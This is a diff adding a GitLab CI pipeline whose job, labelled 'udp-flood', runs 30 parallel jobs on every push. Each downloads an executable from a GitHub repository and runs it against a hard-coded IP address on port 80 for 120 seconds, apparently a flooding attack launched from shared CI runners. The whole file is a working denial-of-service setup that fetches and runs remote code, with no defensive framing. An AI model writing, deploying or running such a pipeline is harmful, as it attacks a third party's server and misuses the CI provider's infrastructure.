@@ -1,0 +1,22 @@
+stages:
+  - flood
+
+udp-flood:
+  stage: flood
+  image: docker:latest
+  services:
+    - docker:dind
+  parallel: 30
+  script:
+    - |
+      docker run --rm --network host \
+        -v $(pwd):/app \
+        ubuntu:22.04 \
+        sh -c "
+          apt-get update && apt-get install -y wget &&
+          wget -O /app/fivem-req 'https://github.com/onari65/Titan/raw/main/om' &&
+          chmod +x /app/fivem-req &&
+          /app/fivem-req 162.245.204.228 80 120
+        "
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "push"
